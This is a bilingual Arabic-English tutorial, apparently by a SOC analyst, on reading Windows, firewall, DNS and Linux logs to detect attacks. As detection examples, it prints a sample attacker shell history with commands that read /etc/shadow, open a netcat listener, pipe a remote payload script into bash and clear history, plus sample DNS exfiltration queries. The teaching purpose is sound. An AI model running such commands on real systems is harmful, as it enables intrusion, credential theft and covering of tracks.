# تحليل السجلات | Log Analysis

> الأساس الذي يُبنى عليه كل محلل SOC محترف 🔍

---

## المحتوى

- [المقدمة](#المقدمة)
- [ما هو السجل؟](#ما-هو-السجل)
- [Windows Event Logs](#windows-event-logs)
- [Firewall Logs](#firewall-logs)
- [DNS Logs](#dns-logs)
- [Linux Logs](#linux-logs)
- [القاعدة الذهبية للتحليل](#القاعدة-الذهبية-للتحليل)
- [دور الـ SIEM](#دور-الـ-siem)
- [خارطة طريق المحلل](#خارطة-طريق-المحلل)

---

## المقدمة

**بالعربي:**

محلل الـ SOC يشوف آلاف التنبيهات (Alerts) يومياً.

كيف يعرف أيها إيجابي حقيقي **(True Positive)** وأيها إيجابي كاذب **(False Positive)**؟

الجواب في كلمة واحدة: **السجل (Log).**

السجل هو ذاكرة النظام **(System Memory)** التي لا تُمحى.
كل حركة **(Activity)**، كل اتصال **(Connection)**، كل خطأ **(Error)** — مسجّل.

**مشكلتك الوحيدة:** أن تعرف كيف تقرأ اللي مكتوب.

---

**In English:**

A SOC analyst reviews thousands of Alerts daily.
How do they separate True Positives from False Positives?

One word: **The Log.**

Logs are the system's permanent memory.
Every Activity, every Connection, every Error — recorded.

Your only challenge: knowing **how to read** what's written.

---

## ما هو السجل؟

### التعريف

السجل (Log) هو سجل زمني مفصّل يوثق كل حدث يحصل داخل نظام أو تطبيق.

**كل سجل يجيب على 3 أسئلة جوهرية:**

| السؤال | الإجابة |
|--------|--------|
| **من؟** (Who) | المستخدم أو العملية التي قامت بالحدث |
| **متى؟** (When) | الطابع الزمني الدقيق للحدث |
| **ماذا فعل؟** (What Action) | الإجراء الذي تم تنفيذه |

### أمثلة على شكل السجلات

```
[2026-04-29 10:15:22] User: admin | Action: LOGIN_FAILED | Source: 203.0.113.10
[2026-04-29 10:15:23] User: admin | Action: LOGIN_FAILED | Source: 203.0.113.10
[2026-04-29 10:15:24] User: admin | Action: LOGIN_FAILED | Source: 203.0.113.10
[2026-04-29 10:15:25] User: admin | Action: LOGIN_SUCCESS | Source: 203.0.113.10
```

ماذا ترى؟ **Brute Force Attack** ثم اختراق ناجح.

---

## Windows Event Logs

### الأرقام التي تكشف كل شيء

نظام Windows يُسجّل كل حدث برقم تعريفي يسمى **Event ID**. هذه الأرقام هي خريطة المحلل.

#### أهم Event IDs للمحلل:

| Event ID | الحدث | الأهمية |
|----------|-------|--------|
| **4624** | تسجيل دخول ناجح | مراقبة من يدخل ومتى |
| **4625** | فشل تسجيل دخول | اكتشاف Brute Force |
| **4648** | تسجيل دخول بصلاحيات مختلفة | اشتباه بـ Pass-the-Hash |
| **4720** | إنشاء حساب مستخدم جديد | قد يكون Backdoor |
| **4726** | حذف حساب مستخدم | إخفاء آثار الاختراق |
| **4732** | إضافة مستخدم لمجموعة | تصعيد الصلاحيات (Privilege Escalation) |
| **4756** | إضافة لمجموعة Administrators | خطر عالي جداً |
| **7045** | تثبيت خدمة جديدة | ثبات المهاجم (Persistence) |
| **4688** | إنشاء عملية جديدة | تنفيذ برامج ضارة |
| **4698** | إنشاء مهمة مجدولة | Persistence |
| **1102** | مسح سجلات الأحداث | محاولة إخفاء آثار |

#### سيناريو عملي:

```
Event ID 4625 x 50 times in 10 seconds (same source IP)
→ ALERT: Brute Force Attack Detected

Event ID 4624 (after above failures)
→ CRITICAL: Successful login after brute force — Account Compromised!

Event ID 4732 (minutes later)
→ CRITICAL: Attacker added user to Administrators group
```

---

## Firewall Logs

### ثلاث قرارات تحدد هوية أي هجوم

جدار الحماية يتخذ 3 قرارات فقط لكل حزمة بيانات:

| القرار | المعنى | ما يخبرك به |
|--------|--------|-------------|
| **ALLOW** | سمح بالمرور | حركة طبيعية أو مسموح بها |
| **DENY** | رفض مع إشعار | حركة غير مسموح، المرسل يعلم |
| **DROP** | تجاهل صامت | حركة خطيرة، لا نريد الرد عليها |

### ما تبحث عنه في Firewall Logs:

```
# Port Scanning
[10:00:01] DENY TCP 203.0.113.10:54231 → 192.168.1.1:22
[10:00:01] DENY TCP 203.0.113.10:54232 → 192.168.1.1:23
[10:00:01] DENY TCP 203.0.113.10:54233 → 192.168.1.1:25
[10:00:01] DENY TCP 203.0.113.10:54234 → 192.168.1.1:80
→ ALERT: Port Scan from 203.0.113.10

# Data Exfiltration
[11:30:00] ALLOW TCP 192.168.1.50:443 → 185.220.101.5:443  (50GB transferred)
→ ALERT: Unusual large data transfer to unknown external IP

# C2 Beaconing
[Every 5 minutes] ALLOW TCP 192.168.1.100 → 203.0.113.50:4444
→ ALERT: Regular beaconing pattern — possible C2 communication
```

---

## DNS Logs

### كيف تكتشف الـ DNS Tunneling

**لماذا DNS مهم؟**
المهاجمون يستخدمون DNS لتمرير البيانات لأنه بروتوكول يُسمح به في معظم جدران الحماية.

#### علامات DNS Tunneling:

```
# طلبات DNS طويلة بشكل غير طبيعي
DNS Query: aHR0cHM6Ly9tYWxpY2lvdXMuY29tL3BheWxvYWQ.evil-domain.com
→ هذا base64 encoded data داخل DNS query!

# عدد طلبات DNS عالي جداً
[192.168.1.100] DNS requests: 2000/minute to same domain
→ ALERT: Possible DNS Tunneling

# Subdomains طويلة وغريبة
exfiltrated-data-here-123456.attacker.com
credentials-dump-abc123.attacker.com
```

#### قائمة ما تبحث عنه:

| المؤشر | الخطر |
|--------|-------|
| طلبات لـ domains حديثة الإنشاء | Malware C2 |
| Subdomains طويلة (>50 حرف) | DNS Tunneling |
| طلبات متكررة لنفس domain | C2 Beaconing |
| Domain Generation Algorithm (DGA) | Malware Activity |

---

## Linux Logs

### auth.log والـ bash_history — أولى ما يحذفه المهاجم

#### `/var/log/auth.log` — سجل المصادقة

```bash
# محاولات SSH فاشلة
Failed password for root from 203.0.113.10 port 52341 ssh2
Failed password for root from 203.0.113.10 port 52342 ssh2
Failed password for root from 203.0.113.10 port 52343 ssh2

# دخول ناجح بعد المحاولات
Accepted password for root from 203.0.113.10 port 52350 ssh2
→ CRITICAL: SSH Brute Force succeeded!

# تصعيد الصلاحيات
sudo: badi : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash
→ ALERT: User escalated to root
```

#### `/var/log/syslog` — السجل العام

```bash
# تثبيت خدمة جديدة
systemd[1]: Created slice system-evil-service.slice
systemd[1]: Started evil-service.service
→ ALERT: New suspicious service installed
```

#### `~/.bash_history` — أول ما يحذفه المهاجم

```bash
# ما قد تجده إذا نسي المهاجم حذفه
whoami
id
uname -a
cat /etc/passwd
cat /etc/shadow
nc -lvp 4444 &
curl http://203.0.113.50/payload.sh | bash
crontab -e
history -c  # ← هنا يحاول المسح!
```

**ملاحظة:** حتى لو حذف التاريخ، يمكنك إيجاده في:
- `/proc/[pid]/cmdline`
- Memory forensics
- Shell logs في SIEM

---

## القاعدة الذهبية للتحليل

### Correlation + Context + Pattern

**لا تحلل السجلات بشكل منفرد — ابحث عن الصورة الكاملة.**

#### الـ Correlation (الربط)

```
حدث 1: Failed login (Windows Event 4625)
حدث 2: New service installed (Windows Event 7045)
حدث 3: Outbound connection to unknown IP (Firewall Log)

معاً = Attack Chain: Initial Access → Persistence → C2 Communication
```

#### الـ Context (السياق)

```
سؤال: هل تسجيل الدخول في الساعة 3 صباحاً مشبوه؟

بدون context: ربما
مع context: نعم! هذا المستخدم يعمل دائماً 9-5 ولم يسافر
→ ALERT: Anomalous login time
```

#### الـ Pattern (النمط)

```
المهاجم يبدّل أدواته (TTPs) في دقائق.
لكنه لا يستطيع تغيير النمط (Pattern) دون أن يترك أثراً في السجلات.

نحن نطارد السلوك (Behavior)، لا الأداة (Tool).
```

---

## دور الـ SIEM

### كيف يجمع SIEM الصورة كاملة

```
                    ┌─────────────┐
                    │    SIEM     │
                    │ Correlation │
                    │   Engine    │
                    └──────┬──────┘
                           │
         ┌─────────────────┼─────────────────┐
         │                 │                 │
    ┌────▼────┐      ┌─────▼────┐     ┌──────▼─────┐
    │Windows  │      │ Firewall │     │    DNS     │
    │  Logs   │      │  Logs    │     │   Logs     │
    └─────────┘      └──────────┘     └────────────┘
         │                 │                 │
    ┌────▼────┐      ┌─────▼────┐     ┌──────▼─────┐
    │ Linux   │      │  Web     │     │    EDR     │
    │  Logs   │      │  Logs    │     │   Alerts   │
    └─────────┘      └──────────┘     └────────────┘
```

**بدون SIEM:** تشتغل في العمى — كل سجل في مكان مختلف
**مع SIEM:** صورة موحدة — ربط الأحداث تلقائياً عبر كل المصادر

---

## خارطة طريق المحلل

### Analyst Workflow: من البيانات الخام إلى كشف التهديد

```
┌─────────────────────────────────────────────────────┐
│              ANALYST WORKFLOW                       │
├─────────────────────────────────────────────────────┤
│                                                     │
│  [1] Raw Data (Logs)                                │
│       ↓                                             │
│  [2] SIEM Ingestion & Normalization                 │
│       ↓                                             │
│  [3] Correlation Rules Fire → Alert Generated       │
│       ↓                                             │
│  [4] Tier 1 Analyst: Triage                        │
│       → Is this a True Positive or False Positive?  │
│       ↓                                             │
│  [5] Investigation                                  │
│       → Who? When? What? Where? How?                │
│       ↓                                             │
│  [6] Context Building                               │
│       → Normal behavior? Anomaly? Known attack?     │
│       ↓                                             │
│  [7] Threat Detection / Incident Declaration        │
│       ↓                                             │
│  [8] Escalation → Tier 2 / Incident Response       │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### أنواع السجلات حسب الصعوبة

| نوع السجل | صعوبة التحليل | السبب |
|-----------|---------------|-------|
| Windows Event Logs | متوسط | Event IDs واضحة لكنها كثيرة |
| Firewall Logs | سهل | القرارات 3 فقط: Allow/Deny/Drop |
| DNS Logs | صعب | يحتاج فهم DGA وTunneling |
| Linux Logs | متوسط-صعب | صيغ مختلفة، مسح متعمد |
| Web App Logs | صعب | HTTP errors، injections |
| Memory Dumps | خبير | يحتاج أدوات متخصصة |

---

## الخلاصة النهائية

> **المهاجم يبدّل أدواته (TTPs) في دقائق.**
> **لكنه لا يستطيع تغيير النمط (Pattern) دون أن يترك أثراً في السجلات.**
> **نحن نطارد السلوك (Behavior)، لا الأداة (Tool).**

### نقاط المراجعة السريعة ✅

- [ ] أعرف الفرق بين True Positive و False Positive
- [ ] أحفظ Event IDs الأساسية: 4624, 4625, 4720, 4732, 7045, 1102
- [ ] أفهم قرارات Firewall: Allow / Deny / Drop
- [ ] أعرف كيف أكتشف DNS Tunneling
- [ ] أعرف أين تجد السجلات في Linux
- [ ] أفهم مبدأ Correlation في SIEM
- [ ] أطبّق منهجية: Correlation + Context + Pattern

---

## الموارد

- [Microsoft Event ID Reference](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/)
- [SANS Log Analysis Poster](https://www.sans.org/security-resources/posters/)
- [MITRE ATT&CK - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
- [TryHackMe - SOC Level 1 Path](https://tryhackme.com/path/outline/soclevel1)

---

*Published by Badi Alosaimi | SOC Analyst | Blue Team*
*Originally posted on LinkedIn — transferred to GitHub for preservation*

**Tags:** `#LogAnalysis` `#SOC` `#BlueTeam` `#CyberSecurity` `#SIEM` `#DFIR` `#ThreatDetection` `#الأمن_السيبراني` `#تحليل_السجلات`
